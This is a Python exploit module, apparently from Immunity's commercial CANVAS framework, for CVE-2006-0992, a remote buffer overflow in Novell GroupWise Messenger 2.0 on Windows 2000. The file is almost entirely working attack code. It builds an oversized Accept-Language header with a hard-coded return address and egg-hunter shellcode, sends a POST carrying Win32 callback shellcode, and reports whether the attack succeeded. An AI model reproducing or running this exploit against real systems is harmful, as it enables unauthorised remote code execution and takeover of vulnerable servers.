#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information


import sys 
if "." not in sys.path:
    sys.path.append(".")

import os
import getopt
import socket
import sys
import struct

# CANVAS modules
from exploitutils import *
from tcpexploit import *
from encoder import addencoder
from shellcode import shellcodeGenerator
from shellcode import win32shell
import canvasengine
import time
from socket import *
from MOSDEF import mosdef 
from MOSDEF.mosdefutils import *

NAME= "Groupwise Messenger 2 Buffer Overflow"
DESCRIPTION= "There exists an Accept-Language Buffer Overflow in Novell GroupWise Messenger 2.0"
VERSION= "1.0"
DOCUMENTATION = {}
DOCUMENTATION['VENDOR']="Novell"
DOCUMENTATION["Date public"]="2006-04-13"
DOCUMENTATION["Repeatability"]="You get one shot"
DOCUMENTATION["CVE Name"] = "CVE-2006-0992"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-0992"
DOCUMENTATION['CVSS'] = 10.0

PROPERTY = {}
PROPERTY["TYPE"]= "Exploit"
PROPERTY["SITE"]=  "Remote"
PROPERTY["ARCH"]= [ ["Windows"] ]
PROPERTY["VERSION"]= ["2000"]

targets = {
    0 : ["Win2k Advanced Server", 0x6103c3d3],
    }

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        # localhost and localport used in shellcode
        self.callbackip = ""
        self.localhost = ""
        self.host = "127.0.0.1"
        self.port = 80
        self.callbackport = 1
        self.localport = 1
        self.covertness = 0
        self.version = 0
        self.badstring = "\x00\x0a\x2c\x3b"
        self.searchbadstring="\x00\x0a\x2c\x3b"
        self.connectionList = []
        self.setInfo(DESCRIPTION)
        self.setInfo(VERSION)
        self.name = NAME
        self.xpacket1badchars=""
        return

    def neededListenerTypes(self):
        return [canvasengine.WIN32MOSDEF]

    def createShellcodexPacket1(self):
        self.shellcode = self.createWin32SearchShellcodeNibble(self.host,self.port)
        return self.encodedsearchcode
    
    def realshellcode(self):
        badstring = "\x00\x0a\x0d\x2c\x3b"
        self.shellcode = self.createWin32Shellcode(badstring,self.localhost,self.localport)
        self.uglytag="PEPE"
        self.tag1="AABB"
        self.tag2="ACAC"
        
        return self.uglytag+self.tag2+self.tag1+self.shellcode
    
    
    def createxPacket1(self):
        buf = '' 
        buf+="GET / HTTP/1.1\r\n"
        buf+="Host: aaa\r\n"
        buf+="Accept-Language: "
        buf+= "a" * 16
        buf+="\xf9\xf3\x01\x61"
        buf+= "b" * 244
        buf+= intel_order(0x6103c3d3)
        buf+="\xeb\x06"
        buf+= "b" * 2
        buf+="\x01\x10\x04\x61"
        buf+="\x90"
        buf+=self.createShellcodexPacket1()
        buf+="\r\n\r\n"
        return buf

    def createPOST(self):
        buf = '' 
        buf+="POST / HTTP/1.1\r\n"
        buf+="Host: aaa\r\n"
        buf+="Content-Length: %s"%str(len(self.realshellcode())+1)
        buf+="\r\n"
        buf+=self.realshellcode()
        buf+="B" * 131
        buf+="\r\n\r\n"
        return buf
    
    def test(self):
        pass

    def run(self):
        self.port=8300
        try:

            self.host = self.target.interface

        except:

            self.host="localhost"
        self.port = int(self.argsDict.get("port", self.port))
        FD_1 = self.gettcpsock()
        self.log("connect(%s,%s)" % (self.host, self.port))
        FD_1.connect((self.host,self.port))
        self.log("Connected!")
        FD_2 = self.gettcpsock()
        self.log("connect(%s,%s)" % (self.host, self.port))
        FD_2.connect((self.host,self.port))
        self.log("Connected!")

        xpacket1buf=self.createxPacket1()
        xpacketPOST=self.createPOST()
        self.log("sending packet...")
        FD_1.send(xpacketPOST)
        
        FD_2.send(xpacket1buf)
        
        
        if self.ISucceeded():
            self.setInfo("%s attacking %s:%d (succeeded!)" % (self.name, self.host, self.port))
            return 1
        self.setInfo("%s attacking %s:%d (failed!)" % (self.name, self.host, self.port))
        return 0

if __name__== '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
